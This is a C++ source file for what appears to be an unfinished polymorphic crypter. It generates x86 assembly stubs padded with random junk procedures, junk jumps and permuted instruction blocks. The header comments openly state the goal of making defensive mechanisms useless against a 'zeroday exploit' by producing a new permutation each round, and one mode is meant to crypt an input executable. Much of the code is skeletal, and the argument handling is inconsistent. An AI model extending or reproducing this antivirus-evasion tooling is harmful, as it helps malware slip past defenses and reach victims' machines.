#include "resource.h"


// basic overview : Generate blocks of data for each stage of the
// overall algorithm toward the output program

// different stages of entire program, for each stage create block
// then continue creating blocks till all stages are complete, and
// program is complete

// For instance:
// --			small delay execution maybe applicable?
// --		   -------------------
// --		   |	Extract data |
// --		   |	decrypt data |-------
// --          -------------------      |  eg swap blocks in series if applicable
// --		   |	Extract path |      |
// --		   |	decrypt path |<------
// --          -------------------
// --

// point, can series of instructions / individual instructions be swapped
// and program retain ability to execute correctly of course - much testing
// will need to occur


// All in all, completely obfuscating the source hence rendering
// defensive mechanism useless for our zeroday exploit which can
// continuosly be generated through simple permutation assembler

// TODO - AI, generate logs of what occurred last in order to
// maintain completely different permutations for each round

AVALIABLEREG		m_stAvaliableReg;
EIGHT_BITREG		m_stEightBitReg;
SIXTEEN_BITREG	    m_stSixteenBitReg;
THIRTYTWO_BITREG	m_stThirtytwoBitReg;


std::list<TRASHOBJ>					g_lsGlobalTrashProcedure;
std::list<TRASHOBJ>::iterator		g_lsGlobalTrashProcedureIterator;
std::list<TRASHOBJ>					g_lsGlobalTrashJMP;
std::list<TRASHOBJ>::iterator		g_lsGlobalTrashJMPIterator;
std::list<TRASHOBJ>					g_lsGlobalTrashDirectInsert;
std::list<TRASHOBJ>::iterator		g_lsGlobalTrashDirectInsertIterator;

std::list<VARIABLE>					g_lsGlobalVariable;
std::list<VARIABLE>::iterator		g_lsGlobalVariableIterator;

std::vector <string>				g_vszGlobalTrashJMPLabels;

unsigned int						g_uiTotalTrashProcObjs		   = 0;
unsigned int						g_uiTotalTrashDirectInsertObjs = 0;
unsigned int						g_uiTotalTrashJMPObjs          = 0;
unsigned int						g_uiTotalTrashObjs             = 0;

unsigned int						g_uiGeneratedOpcodeIndex[2];



static const char g_chAlpha[]	=		// for our Random Character generator
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
//sections

BLOCKOBJ m_sectionArray[5] = {(g_szTemplatePath + "Header.txt"), (g_szTemplatePath + "Include.txt"),
                              (g_szTemplatePath + "Data.txt"),(g_szTemplatePath + "Text.txt"),
                              (g_szTemplatePath + "Import.txt")
                             };

// opcodes
BLOCKOBJ m_opcodeArray[8] = {(g_szOpcodePath + "Arithmetic-1.txt"),	// 0
                             (g_szOpcodePath + "Arithmetic-2.txt"),							// 1
                             (g_szOpcodePath + "Logic-1.txt"),						// 2
                             (g_szOpcodePath + "Misc.txt"),							// 3
                             (g_szOpcodePath + "Transfer-0.txt"),					// 4
                             (g_szOpcodePath + "Transfer-1.txt"),					// 5
                             (g_szOpcodePath + "Transfer-2.txt"),					// 6
                             (g_szOpcodePath + "ConditionalJumps.txt")				// 7
                            };
/*(g_szOpcodePath + "Multiplying.txt"),						// 8
(g_szOpcodePath + "Rotate.txt"),							// 9
(g_szOpcodePath + "Subtracting.txt"),						// 10
(g_szOpcodePath + "Transfer.txt")							// 11
*/
// http://www.jegerlehner.ch/intel/IntelCodeTable.pdf
// http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/index.htm?tx=4
// m_szRegister

int main(int argc, char *argv[])
{

	if (*argv[0] == '1')
	{	// Then we are just generating a brand new stub
	
	}
	else if (*argv[1] == '2')
	{	// Then we will be expecting input executable
	
	}
	else if (*argv[1] == '3')
	{	// Then we just crypt using stub that has already been created, expecting input
	
	}
	g_uiDwordsTillStackCorrupts = 28;
    //DereferenceOperand("EBX");
    AllocateVectorList();	// on startup
	g_lsGlobalVariableIterator			=	 g_lsGlobalVariable.begin();




	InitiateVariableList(); // on startup

	g_lsGlobalTrashJMPIterator			=	 g_lsGlobalTrashJMP.begin();
	g_lsGlobalTrashProcedureIterator	=	 g_lsGlobalTrashProcedure.begin();
	g_lsGlobalTrashDirectInsertIterator =    g_lsGlobalTrashDirectInsert.begin();

    ProcessTrash();

	g_lsGlobalTrashJMPIterator			=	 g_lsGlobalTrashJMP.begin();
	g_lsGlobalTrashProcedureIterator	=	 g_lsGlobalTrashProcedure.begin();
	g_lsGlobalTrashDirectInsertIterator =    g_lsGlobalTrashDirectInsert.begin();


	g_lsGlobalVariableIterator = g_lsGlobalVariable.begin();

	for (unsigned int i = 0; i < g_lsGlobalVariable.size(); i++)
	{
		m_sectionArray[2].m_vszBuffer.push_back(g_lsGlobalVariableIterator->m_szVariableDeclaration);
		g_lsGlobalVariableIterator++;	
	}

	for (unsigned int i = 0; i < g_uiTotalTrashDirectInsertObjs; i++)
	{
		for (unsigned int z = 0; z < g_lsGlobalTrashDirectInsertIterator->m_vszBuffer.size(); z++)
		{
			m_sectionArray[3].m_vszBuffer.push_back(g_lsGlobalTrashDirectInsertIterator->m_vszBuffer[z]);
		}
		g_lsGlobalTrashDirectInsertIterator++;	
	}	// THIS ONE HERE IS CORRECT, COPY AND USE THIS ONE!
	// exit process lol
	m_sectionArray[3].m_vszBuffer.push_back("push 0\nCall [ExitProcess]");

	for (unsigned int i = 0; i <g_uiTotalTrashJMPObjs; i++)
	{
		for (unsigned int z = 0; z < g_lsGlobalTrashJMPIterator->m_vszBuffer.size(); z++)
		{
			m_sectionArray[3].m_vszBuffer.push_back(g_lsGlobalTrashJMPIterator->m_vszBuffer[z]);
		}
		g_lsGlobalTrashJMPIterator++;	
	}

	for (unsigned int i = 0; i <  g_uiTotalTrashProcObjs; i++)
	{
		for (unsigned int z = 0; z < g_lsGlobalTrashProcedureIterator->m_vszBuffer.size(); z++)
		{
			m_sectionArray[3].m_vszBuffer.push_back(g_lsGlobalTrashProcedureIterator->m_vszBuffer[z]);
		}
		g_lsGlobalTrashProcedureIterator++;	
	}

     WriteFile();


							// assign the iterators

	// now generate the program..

	// after generating the program, update text sec, import sec
	// order:  1 - main code flow buffer. 2 - jmp buffer. 3 - proc buffer


    // find random label
    // Finished!
    return 0;
}

// All blocks derived from BaseBlock
// -- Constructors
BLOCKOBJ::BLOCKOBJ(string m_szFileName)
{
    // read files in
    ifstream m_iFile;
    m_iFile.open(m_szFileName);
    if (m_iFile)
    {
        string m_szTemp;
        while (getline(m_iFile,m_szTemp))
        {
            m_vszBuffer.push_back(m_szTemp);
            //m_vszBuffer.push_back("\n");
        }
        m_iFile.close();
    }
    else
    {
        cout << "Error file not found - " << m_szFileName << endl;
    }
}
// these three structs are used as loops
THIRTYTWO_BITREG::THIRTYTWO_BITREG()
{
    m_szRegArray[0] = "EAX";
    m_szRegArray[1] = "EBX";
    m_szRegArray[2] = "ECX";
    m_szRegArray[3] = "EDX";
    m_szRegArray[4] = "EDI";
    m_szRegArray[5] = "ESI";
}
SIXTEEN_BITREG::SIXTEEN_BITREG()
{
    m_szRegArray[0] = "AX";
    m_szRegArray[1] = "BX";
    m_szRegArray[2] = "CX";
    m_szRegArray[3] = "DX";
    m_szRegArray[4] = "DI";
    m_szRegArray[5] = "SI";
}
EIGHT_BITREG::EIGHT_BITREG()
{
    m_szRegArray[0] = "AH";
    m_szRegArray[1] = "AL";
    m_szRegArray[2] = "BH";
    m_szRegArray[3] = "BL";
    m_szRegArray[4] = "CH";
    m_szRegArray[5] = "CL";
    m_szRegArray[6] = "DH";
    m_szRegArray[7] = "DL";
}

AVALIABLEREG::AVALIABLEREG()
{
    // at the beginning of the program should all be true
    EAX = 2;// 0 = in use by program, do not use
    EBX = 2;// 1 = in use by junk program, still can use lower 8 bits
    ECX = 2;// 2 = avaliable to use
    EDX = 2;
    EDI = 1;	// NOTE : ESI/EDI do not have lower 8 bits
    ESI = 1;	// ie TRUE TRUE

    AX = 2;
    BX = 2;
    CX = 2;
    DX = 2;
    DI = 2;
    SI = 2;

    AH = TRUE;
    AL = TRUE;
    BH = TRUE;
    BL = TRUE;
    CH = TRUE;
    CL = TRUE;
    DH = TRUE;
    DL = TRUE;
}
/*
GLOBALVARIABLESUSED::GLOBALVARIABLESUSED(unsigned int m_uiCount)
{
    m_uiGlobalVariablesCount = m_uiCount;
    for (unsigned int i = 0; i < m_uiCount; i++)
    {
        // generate random string
        // push the string back
        // set vector boolean value to false



    }
    //g_chAlpha


}
*/